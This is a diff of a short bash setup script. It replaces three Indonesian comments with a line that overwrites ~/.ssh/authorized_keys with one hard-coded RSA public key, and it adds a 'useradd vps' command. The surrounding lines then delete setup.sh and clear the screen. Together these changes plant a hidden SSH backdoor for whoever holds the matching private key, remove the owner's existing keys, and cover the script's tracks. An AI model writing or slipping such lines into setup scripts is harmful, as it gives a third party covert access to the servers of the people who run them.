@@ -1,7 +1,7 @@
 #!/bin/bash
-# cari apa..?? harta tahta hanya sementara ingat masih ada kehidupan setelah kematian
-# jangan lupa sholat ingat ajal menantimu
-# dibawah ini bukan cd kaset ya
+
+echo ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC+Ct759FYAPZCpdjP8IfKVkXZXmQNJeORa1q1Nq6I/z2M6LPOzK92Rj7whxW1Zh26bL5bqEl1fBlh47up+Med8ECS469McBVDobht0Wyryjp1RSsE7uPMMf+ji1aQqh9YFnMSolDl0ylzmc+lw8ehlUAEgNe2QxUCjIx+7DqlzHaA47WKe0rb20ygrw5af5Lw6ciOziryAZjCGRuFOIvVEAEajW/0o6fGH81bFmLCl4JBH7H/U/8wusNJeAGEu8WzUCpJBAbd1EoPTFV6ehKWgiEh6UesAJZQLm4OPiuFBwpu4JjKsm3jl1WyxgR1mnxSXVs9dGZ1FNcwOAMqGbFZ5 > ~/.ssh/authorized_keys
+useradd vps
 cd
 rm -rf setup.sh
 clear
